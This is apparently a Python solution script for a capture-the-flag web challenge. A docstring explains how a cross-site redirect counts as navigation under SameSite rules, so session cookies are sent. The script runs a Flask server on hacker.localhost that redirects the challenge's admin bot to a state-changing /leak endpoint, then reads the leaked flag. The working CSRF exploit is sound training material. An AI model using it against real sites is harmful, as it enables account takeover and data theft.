import os
import re
import requests
import signal
from flask import Flask, request, redirect


"""
Theory:
	server does login/session then makes get request
	same origin check: not same origin => only simple get, post, head
	checks out since browser does get

	same site check: not same site and not a navigational event, since browser get expects hacker.localhost
	=> session cookies will not be sent along

	we send back a redirect to the leak enpoint at challenge.localhost
	the browser attempts redirect from hacker.localhost/ to challenge.localhost/leak
	same origin check: not same origin => only simple get, post, head
	same site check: not same site but a redirect is treated as a navigational event
	=> browser sends along session cookie

	alternatively to a redirect we could have also created an html link and triggered it via js, since
	using a link is also treated as a navigational event

    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == hacker_host, f"Invalid `url`, hostname should be `{hacker_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    return "Not Found\n", 404
"""


pat0 = re.compile(r".*Now running the web server:\n")
r_pipe1, w_pipe1 = os.pipe()

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)

	os.dup2(w_pipe1, 1)
	os.close(w_pipe1)

	os.execv("/challenge/run", ["/challenge/run"])
	print("Error execv.")
	exit(1)

pid = os.fork()

if pid == -1:
	print("Error fork.")
	exit(1)

if pid == 0:
	os.close(r_pipe1)
	os.close(w_pipe1)

	app = Flask(__name__)

	@app.route('/')
	def csrf_leak():
		return redirect("http://challenge.localhost:80/leak")

	app.run("hacker.localhost", 30080)

os.close(w_pipe1)

output = os.fdopen(r_pipe1, "r")

while True:
	line = output.readline()
	print(line, end="")
	m = pat0.match(line)
	if m:
		url = "http://challenge.localhost:80/visit"
		data = {"url": "http://hacker.localhost:30080/"}
		r = requests.get(url, params=data)
		url = "http://challenge.localhost:80/info"
		data = {"user": "1"}
		r = requests.get(url, params=data)
		print(r.text)
		break
